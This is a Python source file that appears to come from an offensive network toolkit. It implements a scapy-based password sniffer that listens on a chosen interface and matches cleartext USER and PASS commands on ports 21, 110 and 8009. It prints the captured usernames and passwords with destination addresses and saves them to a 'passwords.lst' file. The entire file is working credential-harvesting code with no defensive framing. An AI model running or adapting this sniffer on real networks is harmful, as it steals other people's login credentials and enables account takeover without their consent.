from deadbeef_modules import ipv6module

from socket import getservbyport,  gethostbyname

import socket

from scapy.all import *

# ipv6 password sniffer
class ipv6_pwsniff_module(ipv6module):
    """
    very basic ipv6 password sniffer based on regular expression signatures. to be extended
    """
    
    def init_module(self):
        self.prompt = self.cc.prompt(self.prompt, "password sniffer")                       
        self.valid_parameters = ['iface']
        self.help_parameters['iface'] = "use this interface"
        self.required_parameters = ['iface']
        self.filename = "passwords.lst"
        
        # custom 
        self.dissectors = {}
        self.dissectors[21] = (("USER", r'USER (.*)'), ("PASS", r'PASS (.*)'))
        self.dissectors[110] = (("USER", r'USER (.*)'), ("PASS", r'PASS (.*)'))
        self.dissectors[8009] = (("USER", r'USER (.*)'), ("PASS", r'PASS (.*)'))
        
    def help(self):
        print "sniff for passwords in tcp streams"

    def __tcp_callback(self, pkt):      
        port = pkt.getlayer("TCP").dport
        
        if pkt.getlayer("IP"):
            dst = pkt.getlayer("IP").dst
        else:
            dst = pkt.getlayer("IPv6").dst
            
        if pkt.getlayer("Raw"):
            payload = pkt.getlayer("Raw").load      
        else :
            payload = None
        
        if int(port) in self.dissectors.keys() and payload:         
            for name,  regex in self.dissectors[int(port)]:
                p = re.compile(regex)           
                m = p.match(payload)
                if m:
                    item = m.group(1).rstrip('\r\n')
                    
                    try:
                        s_name = getservbyport(port)
                    except socket.error:
                        s_name = "unknown"
                        
                    self.cc.ok("found %s login: %s = %s [ %s:%s ]\n"  % (s_name, name, self.cc.cc_text('red', item), dst, str(port)))
                    self.save_to_file(self.filename, "found %s login: %s = %s [ %s:%s ]\n" % (s_name, name,  item,  dst,  str(port)))

    def start(self, cmdline):
        self.cc.ok("starting password sniffer...\n")        
        sniff(prn=self.__tcp_callback, filter="tcp and (ip or ip6)", iface=self.parameters['iface'])
